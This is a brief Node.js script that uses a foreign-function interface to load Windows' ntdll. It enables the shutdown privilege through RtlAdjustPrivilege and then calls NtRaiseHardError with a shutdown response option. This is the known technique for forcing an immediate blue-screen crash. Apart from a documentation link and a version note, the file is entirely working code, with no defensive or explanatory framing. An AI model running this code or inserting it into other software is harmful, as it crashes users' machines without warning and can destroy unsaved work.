// https://nodejs.org/api/ffi.html
// works in v26.10.0
const { dlopen, suffix} = require('node:ffi');

{
using ntdll = dlopen(`ntdll.${suffix}`, {
 RtlAdjustPrivilege: {arguments: ['int32', 'bool', 'bool', 'pointer'], return: 'int32'},
 NtRaiseHardError: {arguments:['int32','int32','int32','pointer','int32','pointer'], return: 'int32'}
});

 let PrivilegeState = Buffer.alloc(1);
 let ResponsePointer = new Uint32Array(1);
 console.log(ntdll.functions.RtlAdjustPrivilege(19, 1,0,PrivilegeState))
 console.log(ntdll.functions.NtRaiseHardError(-1073741818,0,0,null,6,ResponsePointer))

}
